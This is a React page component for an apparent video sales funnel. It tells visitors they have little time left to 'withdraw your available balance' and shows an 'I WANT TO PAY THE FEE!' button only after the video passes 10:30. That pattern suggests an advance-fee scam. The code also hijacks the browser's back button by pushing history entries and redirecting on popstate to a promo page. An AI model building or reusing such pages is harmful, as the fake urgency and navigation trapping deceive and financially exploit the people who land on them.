import Button from "@/components/button";
import Comments from "@/components/comments";
import PlacesAlert from '@/components/places-alert';
import VSLBlackKim from "@/components/videos/vsl-black-kim";
import { useLayer } from '@/context/layer-provider';
import { useEffect, useState } from 'react';
import { CheckCheck, Loader2 } from 'lucide-react';

export default function Page({
  active,
  handleClick,
}:{
  active: boolean,
  handleClick: () => void,
}) {

  // COMPONENT STATES
  const [visible, setVisible] = useState<boolean>(false);

  // IMPORT CONTEXT DATA
  const userLayerData = useLayer();

  // USER LAYER DATA
  const userHost = userLayerData.host;
  const userFrontLink = userLayerData.frontLink;

  // SET CONTENT DATA
  const VSL = VSLBlackKim;
  // Deve bater com o ID do player VTurb (sem o prefixo "vid-")
  const videoId = "6925dff292567ba9d54e15c4";
  const backLink = `https://${userHost}/promo`;
  // 10:30 = 630 segundos
  const pitchTime = 630;
  const ctaLink = `${userFrontLink}${userFrontLink.includes("?") ? "&" : "?"}src=kim`;

  // VIDEO VERIFY - Sincronizado com vturb-smartplayer em 10:30 (630 segundos)
  useEffect(() => {
    if (visible) return;

    // Função para verificar o tempo do vídeo
    const checkVideoTime = () => {
      // Verifica diferentes chaves que o vturb-smartplayer pode usar
      const storedResumeTime = Number(localStorage.getItem(videoId + '-resume') || 0);
      const storedPlainTime = Number(localStorage.getItem(videoId) || 0);
      const storedVideoTime = Number(localStorage.getItem('vid-' + videoId) || 0);
      const storedCurrentTime = Number(localStorage.getItem('vid-' + videoId + '-current') || 0);
      
      // Pega o maior valor entre todas as chaves possíveis
      const maxStoredTime = Math.max(storedResumeTime, storedPlainTime, storedVideoTime, storedCurrentTime);

      // Verifica se o tempo atingiu 10:30 (630 segundos)
      if (maxStoredTime >= pitchTime) {
        setVisible(true);
        return true;
      }
      return false;
    };

    // Verifica o tempo do vídeo mais frequentemente para melhor sincronização
    const intervalId = setInterval(() => {
      if (checkVideoTime()) {
        clearInterval(intervalId);
      }
    }, 500); // Verifica a cada 500ms para melhor sincronização

    // Fallback: garante que o botão apareça após 10:35 (635 segundos) mesmo se o player não salvar nada
    const timeoutId = setTimeout(() => {
      setVisible(true);
      clearInterval(intervalId);
    }, (pitchTime + 5) * 1000);

    return () => {
      clearInterval(intervalId);
      clearTimeout(timeoutId);
    };
  }, [videoId, pitchTime, visible]);

  // BACK REDIRECT
  useEffect(() => {
    function setBackRedirect(url: string) {
      let urlBackRedirect = url;
      urlBackRedirect =
        urlBackRedirect.trim() +
        (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
        document.location.search.replace('?', '').toString();
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      window.addEventListener('popstate', () => {
        console.log('onpopstate', urlBackRedirect);
        setTimeout(() => {
          location.href = urlBackRedirect;
        }, 1);
      });
    };

    setBackRedirect(backLink);
  }, [backLink]);

  return (
    <>
      <div className="flex flex-col text-center text-sm rounded-3xl gap-5 bg-gradient-to-t appear border-t px-4 py-6 from-gray-50 to-gray-200/50 border-gray-300">
        <span className="text-base sm:text-2xl font-semibold text-balance tracking-tight">
          There is very little time left to withdraw your available balance. 👇
        </span>
        <PlacesAlert visible={visible} />
      </div>
      <div className="flex flex-col items-center gap-8 relative -mt-4">
        <VSL />
        {visible && (
          <a href={ctaLink}>
            <Button
              onClick={handleClick}
              disabled={active}
              className="pulse border-b-4 !px-6 !py-3 !bg-green-500 !border-green-600 hover:!bg-green-600"
            >
              {active ? (
                <Loader2 className="size-5 animate-spin" />
              ):(
                <CheckCheck className="size-5" />
              )}
              <span>I WANT TO PAY THE FEE!</span>
            </Button>
          </a>
        )}
      </div>
      {!visible && (
        <div className="text-sm text-center p-2">
          🔊 Check if your sound is turned on
        </div>
      )}
      <Comments />
    </>
  );
  
};